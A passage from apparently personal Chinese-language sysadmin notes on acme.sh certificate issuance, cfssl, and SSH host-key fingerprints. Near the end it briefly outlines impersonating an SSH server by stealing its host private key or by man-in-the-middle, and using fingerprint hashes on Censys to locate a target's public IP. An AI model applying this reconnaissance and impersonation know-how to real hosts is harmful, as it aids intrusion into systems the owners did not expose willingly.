<span style="color: #b22222;">#</span><span style="color: #b22222;">&#27491;&#30830;&#30340;&#20570;&#27861;&#23601;&#26159;&#20351;&#29992;--installcert&#21629;&#20196;&#65292;&#25351;&#23450;&#30446;&#26631;&#20301;&#32622;&#65292;&#28982;&#21518;&#35777;&#20070;&#25991;&#20214;&#20250;&#34987; copy &#21040;&#30456;&#24212;&#30340;&#20301;&#32622;&#12290;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#19968;&#26465;&#21629;&#20196;&#21363;&#21487;&#35299;&#20915;&#65306;</span>
acme.sh  --installcert -d esofar.cn <span style="color: #8b2252;">\</span>
         --key-file /etc/nginx/ssl/esofar.cn.key <span style="color: #8b2252;">\</span>
         --fullchain-file /etc/nginx/ssl/fullchain.cer <span style="color: #8b2252;">\</span>
         --reloadcmd <span style="color: #8b2252;">"service nginx force-reload"</span>
</pre>
</div>

<p>
更新 acme.sh
</p>

<p>
目前由于 acme 协议和 letsencrypt CA 都在频繁的更新, 因此acme.sh 也经常
更新以保持同步。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#21319;&#32423; acme.sh &#21040;&#26368;&#26032;&#29256;&#65306;</span>
acme.sh --upgrade
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#24744;&#19981;&#24819;&#25163;&#21160;&#21319;&#32423;,&#65292;&#21487;&#20197;&#24320;&#21551;&#33258;&#21160;&#21319;&#32423;&#65306;</span>
acme.sh  --upgrade  --auto-upgrade
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#24744;&#20063;&#21487;&#20197;&#38543;&#26102;&#20851;&#38381;&#33258;&#21160;&#26356;&#26032;&#65306;</span>
acme.sh --upgrade  --auto-upgrade  0
</pre>
</div>

<p>
Let'sEncrypt 证书更新显示 It seems the CA server is busy now 解决方法
看官方升级api接口
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#21319;&#32423; acme.sh &#21040;&#26368;&#26032;&#29256;&#65306;</span>
acme.sh --upgrade
</pre>
</div>
</div>
</div>
<div id="outline-container-h:879e5130-9967-4edd-a1b4-7b7432f5ec17" class="outline-4">
<h4 id="h:879e5130-9967-4edd-a1b4-7b7432f5ec17">申请证书-dns方式</h4>
<div class="outline-text-4" id="text-h:879e5130-9967-4edd-a1b4-7b7432f5ec17">
<p>
<a href="https://github.com/acmesh-official/acme.sh/wiki/dnsapi">https://github.com/acmesh-official/acme.sh/wiki/dnsapi</a>
</p>

<p>
范例：申请阿里云证书-dns方式
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#23450;&#20041;&#20840;&#23616;&#21464;&#37327;</span>
<span style="color: #483d8b;">export</span> <span style="color: #a0522d;">Ali_Key</span>=<span style="color: #8b2252;">"LTAI4Fqcsxxxb"</span> 
<span style="color: #483d8b;">export</span> <span style="color: #a0522d;">Ali_Secret</span>=<span style="color: #8b2252;">"whTtvJsQwYxxxg"</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#30003;&#35831;&#35777;&#20070;</span>
~/.acme.sh/acme.sh --issue --dnssleep 10 --dns dns_ali -d qx.com -d <span style="color: #8b2252;">"*.qx.com"</span> 
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#31561;&#24453;...</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#32493;&#36153;&#25152;&#26377;&#35777;&#20070;</span>
~/.acme.sh/acme.sh --renew-all --dnssleep 10
</pre>
</div>

<p>
范例：aws route53
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">export</span>  <span style="color: #a0522d;">AWS_ACCESS_KEY_ID</span>=XXXXXXXXXX
<span style="color: #483d8b;">export</span>  <span style="color: #a0522d;">AWS_SECRET_ACCESS_KEY</span>=XXXXXXXXXXXXXXX

./acme.sh --issue --dns dns_aws -d example.com -d www.example.com

<span style="color: #b22222;">#</span><span style="color: #b22222;">AWS_ACCESS_KEY_ID &#12289; AWS_SECRET_ACCESS_KEY&#21644;AWS_DNS_SLOWRATE&#23558;&#33258;&#21160;&#20445;&#23384;&#22312;~/.acme.sh/account.conf&#20013;&#65292;&#24182;&#22312;&#38656;&#35201;&#26102;&#37325;&#22797;&#20351;&#29992;&#12290;</span>
</pre>
</div>


<p>
范例：aws route53 并执行证书同步脚本
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">root</span>
groupadd acme_group
useradd -d /home/aws-ssl -g acme_group aws-ssl

mkdir /opt/acme_result
chmod 775 /opt/acme_result/
chown :acme_group /opt/acme_result/

su - aws-ssl
<span style="color: #483d8b;">cd</span> ~/.acme.sh
cat &lt;&lt;\EOF&gt; create.sh 
<span style="color: #ffa54f;">if [ $# -ne 2 ];then</span>
<span style="color: #ffa54f;">echo "&#35831;&#20256;&#36882; &#22495;&#21517;&#12289;&#30417;&#21548;id &#20004;&#20010;&#21442;&#25968;"</span>
<span style="color: #ffa54f;">exit</span>
<span style="color: #ffa54f;">fi</span>
<span style="color: #ffa54f;">domain=$1</span>
<span style="color: #ffa54f;">listen_id=$2</span>
<span style="color: #ffa54f;">domain_dir=/opt/acme_result/${domain}</span>
<span style="color: #ffa54f;">mkdir -p ${domain_dir}</span>

<span style="color: #ffa54f;">./acme.sh --issue --dns dns_aws -d ${domain} -d *.${domain} -d *.qa.${domain} \</span>
<span style="color: #ffa54f;">--cert-file      ${domain_dir}/cert.pem  \</span>
<span style="color: #ffa54f;">--key-file       ${domain_dir}/key.pem  \</span>
<span style="color: #ffa54f;">--fullchain-file ${domain_dir}/fullchain.pem \</span>
<span style="color: #ffa54f;">--reloadcmd     "/opt/acme_venv/bin/python /opt/shell/deploy_aliyun_cert.py ${domain} sg ${listen_id}"</span>
<span style="color: #ffa54f;">EOF</span>
</pre>
</div>

<p>
命令行中所有配置信息都保存在{域名}.conf文件中
</p>
<div class="org-src-container">
<pre class="src src-sh">[aws-ssl@acme-manage xxx.com]$ cat xxx.com.conf 
<span style="color: #a0522d;">Le_Domain</span>=<span style="color: #8b2252;">'xxx.com'</span>
<span style="color: #a0522d;">Le_Alt</span>=<span style="color: #8b2252;">'*.xxx.com,*.qa.xxx.com'</span>
<span style="color: #a0522d;">Le_Webroot</span>=<span style="color: #8b2252;">'dns_aws'</span>
...
<span style="color: #a0522d;">Le_RealCertPath</span>=<span style="color: #8b2252;">'/opt/acme_result/xxx.com/cert.pem'</span>
<span style="color: #a0522d;">Le_RealCACertPath</span>=<span style="color: #8b2252;">''</span>
<span style="color: #a0522d;">Le_RealKeyPath</span>=<span style="color: #8b2252;">'/opt/acme_result/xxx.com/key.pem'</span>
<span style="color: #a0522d;">Le_ReloadCmd</span>=<span style="color: #8b2252;">'__ACME_BASE64__START_L29wdC9hY21lX3ZlbnYvYmluL3B5dGhvbiAvb3B0L3NoZWxsL2RlcGxveV9hbGl5dW5fY2VydC5weSB4eHguY29t__ACME_BASE64__END_'</span>
<span style="color: #a0522d;">Le_RealFullChainPath</span>=<span style="color: #8b2252;">'/opt/acme_result/xxx.com/fullchain.pem'</span>

[aws-ssl@acme-manage xxx.com]$ ls
backup xxx.com.cer  xxx.com.conf  xxx.com.csr  xxx.com.csr.conf  xxx.com.key  ca.cer  fullchain.cer
[aws-ssl@acme-manage xxx.com]$ echo <span style="color: #8b2252;">'L29wdC9hY21lX3ZlbnYvYmluL3B5dGhvbiAvb3B0L3NoZWxsL2RlcGxveV9hbGl5dW5fY2VydC5weSB4eHguY29t'</span>|base64 -d
/opt/acme_venv/bin/python /opt/shell/deploy_aliyun_cert.py xxx.com
</pre>
</div>
</div>
</div>
<div id="outline-container-h:cf1ef02a-ee11-4778-aad5-16076a8f1cc1" class="outline-4">
<h4 id="h:cf1ef02a-ee11-4778-aad5-16076a8f1cc1">追加域名</h4>
<div class="outline-text-4" id="text-h:cf1ef02a-ee11-4778-aad5-16076a8f1cc1">
<p>
下面命令中两个”-d”建议先输入泛域名，这样在证书里可以显示*.xx.com这样的泛域名，
</p>

<div class="org-src-container">
<pre class="src src-sh">~/.acme.sh/acme.sh --issue --dnssleep 10 --dns dns_ali -d yz.com -d <span style="color: #8b2252;">"*.yz.com"</span> -d <span style="color: #8b2252;">"*.yf.yz.com"</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:0f904190-1897-40ba-a1f1-c9c7dda8b862" class="outline-4">
<h4 id="h:0f904190-1897-40ba-a1f1-c9c7dda8b862">续费所有证书</h4>
<div class="outline-text-4" id="text-h:0f904190-1897-40ba-a1f1-c9c7dda8b862">
<div class="org-src-container">
<pre class="src src-sh">~/.acme.sh/acme.sh --renew-all --dnssleep 10
</pre>
</div>
</div>
</div>
<div id="outline-container-h:40801e62-b77c-4de5-940c-101f8a15014b" class="outline-4">
<h4 id="h:40801e62-b77c-4de5-940c-101f8a15014b">测试nginx的公网地址</h4>
<div class="outline-text-4" id="text-h:40801e62-b77c-4de5-940c-101f8a15014b">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#30003;&#35831;</span>
~/.acme.sh/acme.sh --issue --dnssleep 10    --dns dns_ali -d yz.com -d <span style="color: #8b2252;">"*.yz.com"</span> <span style="color: #8b2252;">\</span>
--installcert<span style="color: #8b2252;">\</span>
--key-file /usr/local/nginx/conf/yz.com.key <span style="color: #8b2252;">\</span>
--fullchain-file /usr/local/nginx/conf/fullchain.cer <span style="color: #8b2252;">\</span>
--reloadcmd <span style="color: #8b2252;">"service nginx force-reload"</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#32493;&#36153;</span>
~/.acme.sh/acme.sh --renew --dns -d ss.com -d *.ss.com

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#30003;&#35831;</span>
*.xyf.com&#22495;&#21517;&#35777;&#20070;&#30003;&#35831;
~/.acme.sh/acme.sh --issue --dns dns_ali -d xyf.com-d <span style="color: #8b2252;">"*.xyf.com"</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#32493;&#36153;</span>
~/.acme.sh/acme.sh --renew --force --dns dns_ali    -d xyf.com    -d <span style="color: #8b2252;">"*.xyf.com"</span>
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:a53471ea-65eb-40da-a724-687cca688a23" class="outline-3">
<h3 id="h:a53471ea-65eb-40da-a724-687cca688a23">certutil</h3>
<div class="outline-text-3" id="text-h:a53471ea-65eb-40da-a724-687cca688a23">
<p>
<a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/tools/NSS_Tools_certutil">https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/tools/NSS_Tools_certutil</a>
</p>

<p>
<a href="https://docs.oracle.com/cd/E19900-01/820-0847/ablrg/index.html">https://docs.oracle.com/cd/E19900-01/820-0847/ablrg/index.html</a>
</p>
</div>
</div>
<div id="outline-container-h:e712b1fa-59f7-40fc-a6e8-630584f5fb0d" class="outline-3">
<h3 id="h:e712b1fa-59f7-40fc-a6e8-630584f5fb0d">cfssl</h3>
<div class="outline-text-3" id="text-h:e712b1fa-59f7-40fc-a6e8-630584f5fb0d">
<p>
CFSSL是CloudFlare开源的一款PKI/TLS工具。 CFSSL 包含一个命令行工具和一
个用于 签名，验证并且捆绑TLS证书的 HTTP API 服务。 使用Go语言编写。
</p>

<p>
cfssl自签证书工具集包含3个软件：
</p>

<ul class="org-ul">
<li>cfssl: 用于签发证书；</li>
<li>cfssljson: 将cfssl签发生成的证书(json格式)变成文件承载式文件；</li>
<li>cfssl-certinfo: 验证查看证书信息。</li>
</ul>

<p>
下载cfssl工具：<a href="https://pkg.cfssl.org/">https://pkg.cfssl.org/</a>.
</p>

<div class="org-src-container">
<pre class="src src-sh">curl -s -L -o /bin/cfssl https://pkg.cfssl.org/R1.2/cfssl_linux-amd64
curl -s -L -o /bin/cfssljson https://pkg.cfssl.org/R1.2/cfssljson_linux-amd64
curl -s -L -o /bin/cfssl-certinfo https://pkg.cfssl.org/R1.2/cfssl-certinfo_linux-amd64
chmod +x /bin/cfssl*
</pre>
</div>
</div>
</div>
<div id="outline-container-h:bc82687b-b843-4c01-aaa8-43eb50e3d456" class="outline-3">
<h3 id="h:bc82687b-b843-4c01-aaa8-43eb50e3d456">开源证书管理平台</h3>
<div class="outline-text-3" id="text-h:bc82687b-b843-4c01-aaa8-43eb50e3d456">
<ul class="org-ul">
<li><a href="https://github.com/certd/certd">certd</a></li>
<li><a href="https://github.com/dromara/domain-admin">domain-admin</a></li>
</ul>
</div>
</div>
</section>
<section id="outline-container-h:9cf245cd-11fa-4f87-8223-533d695354e0" class="outline-2">
<h2 id="h:9cf245cd-11fa-4f87-8223-533d695354e0">ssh服务</h2>
<div class="outline-text-2" id="text-h:9cf245cd-11fa-4f87-8223-533d695354e0">
</div>
<div id="outline-container-h:fd47a345-6746-4b7c-95ea-900580604fc1" class="outline-3">
<h3 id="h:fd47a345-6746-4b7c-95ea-900580604fc1">ssh服务介绍</h3>
<div class="outline-text-3" id="text-h:fd47a345-6746-4b7c-95ea-900580604fc1">
<p>
官网：<a href="https://www.openssh.com/manual.html">https://www.openssh.com/manual.html</a>
</p>

<p>
ssh: secure shell, protocol, 22/tcp, 安全的远程登录,代替 telnet
</p>

<p>
具体的软件实现：
</p>

<ul class="org-ul">
<li>OpenSSH: ssh协议的开源实现，CentOS默认安装</li>
<li>dropbear：另一个开源实现</li>
</ul>

<p>
SSH协议版本
</p>

<ul class="org-ul">
<li>v1: 基于CRC-32做MAC，不安全；man-in-middle</li>
<li>v2：双方主机协议选择安全的MAC方式，基于DH算法做密钥交换，基于RSA或DSA实现身份认证</li>
</ul>
</div>
<div id="outline-container-h:f98dceb2-4a2a-41a8-af68-ac8d8a603895" class="outline-4">
<h4 id="h:f98dceb2-4a2a-41a8-af68-ac8d8a603895">公钥交换原理</h4>
<div class="outline-text-4" id="text-h:f98dceb2-4a2a-41a8-af68-ac8d8a603895">

<figure id="org0b875f2">
<img src="images/image-20210120191513811.png" alt="image-20210120191513811.png" width="50%">

</figure>


<figure id="org0badedf">
<img src="images/image-20210120191532193.png" alt="image-20210120191532193.png" width="50%">

</figure>

<p>
主机公钥和私钥位置/etc/ssh/
</p>

<pre class="example" id="org5fcd36b">
# 主机公钥和私钥位置/etc/ssh/
[root@pre-prod ~]# ll /etc/ssh/
-rw-r--r--  1 root root       2284 Dec 21 15:32 ssh_config
-rw-------  1 root root       3905 Mar 18  2020 sshd_config
-rw-r-----. 1 root ssh_keys    227 Mar 17  2020 ssh_host_ecdsa_key
-rw-r--r--. 1 root root        162 Mar 17  2020 ssh_host_ecdsa_key.pub
-rw-r-----. 1 root ssh_keys   1679 Mar 17  2020 ssh_host_rsa_key
-rw-r--r--. 1 root root        382 Mar 17  2020 ssh_host_rsa_key.pub
</pre>

<ul class="org-ul">
<li>客户端发起链接请求，人为确认对方身份。如：ssh命令 <code>ssh 10.0.1.80</code></li>
<li>服务端返回自己的公钥，以及一个会话ID（这一步客户端得到服务端公钥）如
/etc/ssh/ssh_host_ecdsa_key.pub公钥文件</li>
<li>客户端生成密钥对</li>
<li>客户端用自己的公钥异或会话ID，计算出一个值Res，并用服务端的公钥加密</li>
<li>客户端发送加密后的值到服务端，服务端用私钥解密,得到Res</li>
<li>服务端用解密后的值Res异或会话ID，计算出客户端的公钥（这一步服务端得到客户端公钥）</li>
<li>最终：双方各自持有三个秘钥，分别为自己的一对公、私钥，以及对方的公钥，之后的所有通讯都会被加密</li>
</ul>

<p>
范例：验证身份确认，哈希值
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#36828;&#31471;&#26381;&#21153;&#22120;&#20844;&#38053;&#25991;&#20214;</span>
[ec2-user@ip-172-31-5-34 ~]$ ls /etc/ssh/ssh_host_e*.pub
/etc/ssh/ssh_host_ecdsa_key.pub  /etc/ssh/ssh_host_ed25519_key.pub

<span style="color: #b22222;"># </span><span style="color: #b22222;">1. &#30830;&#35748;&#21704;&#24076;&#20540; &#12290;&#31532;&#19968;&#27425;&#30830;&#23450;&#36523;&#20221;&#65292;&#20043;&#21518;&#23601;&#19981;&#29992;&#20102;&#12290;&#23558;&#20844;&#38053;&#20449;&#24687;&#20445;&#23384;&#21040;&#20102;&#26412;&#22320;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26412;&#22320;ssh&#30331;&#24405;&#26080;&#31471;&#26381;&#21153;</span>
root@VM-8-13-ubuntu:~# ssh ec2-user@15.207.14.66
The authenticity of host <span style="color: #8b2252;">'15.207.14.66 (15.207.14.66)'</span> can<span style="color: #8b2252;">'t be established.</span>
<span style="color: #8b2252;">ED25519 key fingerprint is SHA256:M0Trt36g+uzls7ri1/tUJBUL1h4CrgURYAF61EvTdn0.  #&#21704;&#24076;&#20540;</span>
<span style="color: #8b2252;">This key is not known by any other names.</span>
<span style="color: #8b2252;">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes # &#31532;&#19968;&#27425;&#30830;&#23450;&#36523;&#20221;</span>
<span style="color: #8b2252;">Warning: Permanently added '</span>15.207.14.66<span style="color: #8b2252;">' (ED25519) to the list of known hosts.</span>
<span style="color: #8b2252;">ec2-user@15.207.14.66: Permission denied (publickey,gssapi-keyex,gssapi-with-mic). #&#22240;&#20026;&#27809;&#20570;&#20813;&#23494;&#65292;&#25152;&#20197;&#26080;&#27861;&#30331;&#24405;</span>

<span style="color: #8b2252;">#&#20132;&#25442;&#20844;&#38053;&#65292;&#24182;&#20445;&#23384;&#22312;.ssh/known_hosts&#25991;&#20214;</span>
<span style="color: #8b2252;">root@VM-8-13-ubuntu:~# cat .ssh/known_hosts |grep 15.207.14.66</span>
<span style="color: #8b2252;">15.207.14.66 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIP4wTKbQiByeDw1xrC4SNcc6x4XBVrj+aFp1iH7lIgZ</span>

<span style="color: #8b2252;">#&#22914;&#26524;&#33021;&#25104;&#21151;&#30331;&#24405;&#65292;&#20250;&#25226;&#36828;&#31471;/etc/ssh/ssh_host_e*.pub&#20844;&#38053;&#20449;&#24687;&#21644;~/.ssh/id_rsa.pub&#20844;&#38053;&#20449;&#24687;&#20445;&#23384;&#21040;&#26412;&#22320;.ssh/known_hosts&#25991;&#20214;&#20013;</span>
<span style="color: #8b2252;">#[10.3.8.13]:65522 ssh-ed25519 AAAxxxxz</span>
<span style="color: #8b2252;">#[10.3.8.13]:65522 ssh-rsa AAAAB3Nzxxxxx</span>
<span style="color: #8b2252;">#[10.3.8.13]:65522 ecdsa-sha2-nistp256 AAAAE2Vj</span>

<span style="color: #8b2252;">#&#26597;&#30475;~/.ssh/known_hosts&#20013;&#20445;&#23384;&#36828;&#31471;&#30340;&#25351;&#32441;&#20449;&#24687;</span>
<span style="color: #8b2252;">root@VM-8-13-ubuntu:~# ssh-keygen -E sha256 -lf ~/.ssh/known_hosts</span>
<span style="color: #8b2252;">256 SHA256:M0Trt36g+uzls7ri1/tUJBUL1h4CrgURYAF61EvTdn0 15.207.14.66 (ED25519)</span>


<span style="color: #8b2252;">#&#23545;&#27604;&#36828;&#31471;&#20844;&#38053;&#20449;&#24687;&#21644;&#20844;&#38053;&#25351;&#32441;&#65288;&#21704;&#24076;&#20540;&#65289;&#26159;&#21542;&#21644;known_hosts&#30340;&#19968;&#26679;</span>
<span style="color: #8b2252;">[ec2-user@ip-172-31-5-34 ~]$ cat /etc/ssh/ssh_host_ed25519_key.pub </span>
<span style="color: #8b2252;">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIP4wTKbQiByeDw1xrC4SNcc6x4XBVrj+aFp1iH7lIgZ root@ip-172-31-5-34.ap-south-1.compute.internal</span>

<span style="color: #8b2252;">[ec2-user@ip-172-31-5-34 ~]$ ssh-keygen -E sha256 -lf /etc/ssh/ssh_host_ed25519_key.pub</span>
<span style="color: #8b2252;">256 SHA256:M0Trt36g+uzls7ri1/tUJBUL1h4CrgURYAF61EvTdn0 root@ip-172-31-5-34.ap-south-1.compute.internal (ED25519)</span>


<span style="color: #8b2252;">#&#20266;&#35013;</span>
<span style="color: #8b2252;"># &#26041;&#27861;1 &#20599;&#21462;&#30446;&#26631;&#26426;&#22120;&#30340;&#31169;&#38053;/etc/ssh/ssh_host_ecdsa_key&#21040;&#26412;&#22320;&#37325;&#21551;sshd&#65292;&#24182;&#20882;&#20805;&#30446;&#26631;ip</span>
<span style="color: #8b2252;"># &#26041;&#27861;2 &#20013;&#38388;&#21163;&#25345;</span>
</pre>
</div>
</div>
<div id="outline-container-h:167b8ec4-9ecc-486b-a809-470121524e83" class="outline-5">
<h5 id="h:167b8ec4-9ecc-486b-a809-470121524e83">指纹信息</h5>
<div class="outline-text-5" id="text-h:167b8ec4-9ecc-486b-a809-470121524e83">
<p>
<b>known_hosts</b>
</p>

<p>
~/.ssh/known_hosts 用于存储远程主机的公钥信息，以确保用户连接到的是合法的服务器，防止中间人攻击。
这个文件中的内容通常是以一种哈希的形式存储的，这意味着即使文件被查看，也无法直接从中获取到明文的IP地址信息
</p>

<p>
格式如下
</p>
<div class="org-src-container">
<pre class="src src-sh">[&#20027;&#26426;&#21517;&#25110;IP&#22320;&#22336;],[&#21487;&#36873;&#30340;&#31471;&#21475;&#21495;] [&#23494;&#38053;&#31867;&#22411;] [&#20844;&#38053;&#20869;&#23481;]
</pre>
</div>

<p>
范例
</p>
<div class="org-src-container">
<pre class="src src-sh">root@VM-8-13-ubuntu:~# cat .ssh/known_hosts
15.207.14.66 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIP4wTKbQiByeDw1xrC4SNcc6x4XBVrj+aFp1iH7lIgZ
</pre>
</div>

<p>
默认保存的信息是通过密文保存的, 可修改/etc/ssh/ssh_config文件，将 HashKnownHosts 默认值 yes
改为 no，清空 known_hosts 文件，再连接服务端，就可以看到 known_hosts 已经显示 IP 地址了
</p>

<p>
<b>获取公钥信息</b>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#36828;&#31243;&#26597;&#30475;&#20844;&#38053;</span>
ssh-keyscan -t &#20844;&#28982;&#31867;&#22411; ip&#25110;&#21517;&#31216;

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26412;&#22320;&#20844;&#38053;</span>
ll /etc/ssh/ssh_host_e*.pub
ll ~/.ssh/id_rsa.pub
</pre>
</div>

<p>
范例：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#33719;&#21462;&#26080;&#31471;ssh&#20844;&#38053;</span>
root@VM-8-13-ubuntu:~# ssh-keyscan  -p 22 15.207.14.66
15.207.14.66 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH8D9w22YKZ9qPtMpPh2UTxwHtblvzYpKveqj5TvtARgLUUmftv72hnDetPDaekBxe3+<span style="color: #a0522d;">F776dV9DXThcFSlKIeU</span>=
15.207.14.66 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIP4wTKbQiByeDw1xrC4SNcc6x4XBVrj+aFp1iH7lIgZ

root@VM-8-13-ubuntu:~# ssh-keyscan -t ed25519 -p 22 15.207.14.66
15.207.14.66 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIP4wTKbQiByeDw1xrC4SNcc6x4XBVrj+aFp1iH7lIgZ
root@VM-8-13-ubuntu:~# ssh-keyscan -t ECDSA -p 22 15.207.14.66
15.207.14.66 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH8D9w22YKZ9qPtMpPh2UTxwHtblvzYpKveqj5TvtARgLUUmftv72hnDetPDaekBxe3+<span style="color: #a0522d;">F776dV9DXThcFSlKIeU</span>=

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;&#26412;&#22320;&#20844;&#38053;</span>
[ec2-user@ip-172-31-5-34 ~]$ cat /etc/ssh/ssh_host_ecdsa_key.pub 
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH8D9w22YKZ9qPtMpPh2UTxwHtblvzYpKveqj5TvtARgLUUmftv72hnDetPDaekBxe3+<span style="color: #a0522d;">F776dV9DXThcFSlKIeU</span>= root@ip-172-31-5-34.ap-south-1.compute.internal
[ec2-user@ip-172-31-5-34 ~]$ cat /etc/ssh/ssh_host_ed25519_key.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIP4wTKbQiByeDw1xrC4SNcc6x4XBVrj+aFp1iH7lIgZ root@ip-172-31-5-34.ap-south-1.compute.internal
</pre>
</div>

<p>
<b>公钥指纹转换</b>
</p>

<p>
ssh-keygen -E 哈希类型 -lf 公钥文件
</p>

<p>
范例
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#26412;&#22320;&#20844;&#38053;&#25351;&#32441;</span>
[ec2-user@ip-172-31-5-34 ~]$ cat /etc/ssh/ssh_host_ed25519_key.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIP4wTKbQiByeDw1xrC4SNcc6x4XBVrj+aFp1iH7lIgZ root@ip-172-31-5-34.ap-south-1.compute.internal

[ec2-user@ip-172-31-5-34 ~]$ ssh-keygen -E sha256 -lf /etc/ssh/ssh_host_ed25519_key.pub 
256 SHA256:M0Trt36g+uzls7ri1/tUJBUL1h4CrgURYAF61EvTdn0 root@ip-172-31-5-34.ap-south-1.compute.internal (ED25519)
[ec2-user@ip-172-31-5-34 ~]$ ssh-keygen -E md5 -lf /etc/ssh/ssh_host_ed25519_key.pub 
256 MD5:a3:0a:34:dc:ba:ba:a1:27:59:06:84:2f:e1:ae:38:d5 root@ip-172-31-5-34.ap-south-1.compute.internal (ED25519)

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36828;&#31471;&#20844;&#38053;&#25351;&#32441;</span>
root@VM-8-13-ubuntu:~# ssh-keygen -E sha256 -lf ~/.ssh/known_hosts
256 SHA256:M0Trt36g+uzls7ri1/tUJBUL1h4CrgURYAF61EvTdn0 15.207.14.66 (ED25519)
root@VM-8-13-ubuntu:~# ssh-keygen -E md5 -lf ~/.ssh/known_hosts
256 MD5:a3:0a:34:dc:ba:ba:a1:27:59:06:84:2f:e1:ae:38:d5 15.207.14.66 (ED25519)

root@VM-8-13-ubuntu:~# ssh-keyscan -t ED25519 -p 22 15.207.14.66 2&gt;/dev/null | ssh-keygen -E sha256 -lf -
256 SHA256:M0Trt36g+uzls7ri1/tUJBUL1h4CrgURYAF61EvTdn0 15.207.14.66 (ED25519)
root@VM-8-13-ubuntu:~# ssh-keyscan -t ED25519 -p 22 15.207.14.66 2&gt;/dev/null | ssh-keygen -E md5 -lf -
256 MD5:a3:0a:34:dc:ba:ba:a1:27:59:06:84:2f:e1:ae:38:d5 15.207.14.66 (ED25519)
</pre>
</div>

<p>
其他方法
</p>
<div class="org-src-container">
<pre class="src src-sh">[ec2-user@ip-172-31-5-34 ~]$ cat /etc/ssh/ssh_host_ed25519_key.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIP4wTKbQiByeDw1xrC4SNcc6x4XBVrj+aFp1iH7lIgZ root@ip-172-31-5-34.ap-south-1.compute.internal

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20844;&#38053;md5</span>
~# echo <span style="color: #8b2252;">'AAAAC3NzaC1lZDI1NTE5AAAAIIP4wTKbQiByeDw1xrC4SNcc6x4XBVrj+aFp1iH7lIgZ'</span> |base64 -d | md5sum
a30a34dcbabaa1275906842fe1ae38d5  -

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20844;&#38053;sha256</span>
~# echo <span style="color: #8b2252;">'AAAAC3NzaC1lZDI1NTE5AAAAIIP4wTKbQiByeDw1xrC4SNcc6x4XBVrj+aFp1iH7lIgZ'</span> |base64 -d | shasum -a 256 -b
3344ebb77ea0faece5b3bae2d7fb5424150bd61e02ae051160017ad44bd3767d *-

~# echo <span style="color: #8b2252;">'AAAAC3NzaC1lZDI1NTE5AAAAIIP4wTKbQiByeDw1xrC4SNcc6x4XBVrj+aFp1iH7lIgZ'</span> |base64 -d | shasum -a 256 -b | awk <span style="color: #8b2252;">'{print $1}'</span> | xxd -r -p | base64|cut -d <span style="color: #8b2252;">'='</span> -f1
M0Trt36g+uzls7ri1/tUJBUL1h4CrgURYAF61EvTdn0
</pre>
</div>

<p>
<b>ssh指纹收集</b>
</p>

<p>
ssh sha256大概率是全球唯一值，因此若目标开放SSH服务到公网，这个值极有可能被网络空间搜索引擎抓取，从而可以利用这个Hash检索出其公网IP.
</p>

<p>
范例：获取Hash值
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#35745;&#31639;SHA256&#65292;&#27880;&#24847;&#21040;&#35813;Hash&#30340;&#32534;&#30721;&#26041;&#24335;&#21435;&#25481;&#20102;&#26368;&#21518;&#30340;"="&#21495;&#65292;&#38656;&#35201;&#34917;&#36275;</span>
root@VM-8-13-ubuntu:~# echo <span style="color: #8b2252;">'M0Trt36g+uzls7ri1/tUJBUL1h4CrgURYAF61EvTdn0''='</span> |base64 -d |xxd -p -c 100
3344ebb77ea0faece5b3bae2d7fb5424150bd61e02ae051160017ad44bd3767d
</pre>
</div>

<p>
 Sha256 Hash检索网站：<a href="https://search.censys.io/data">https://search.censys.io/data</a>
搜索语法：
</p>

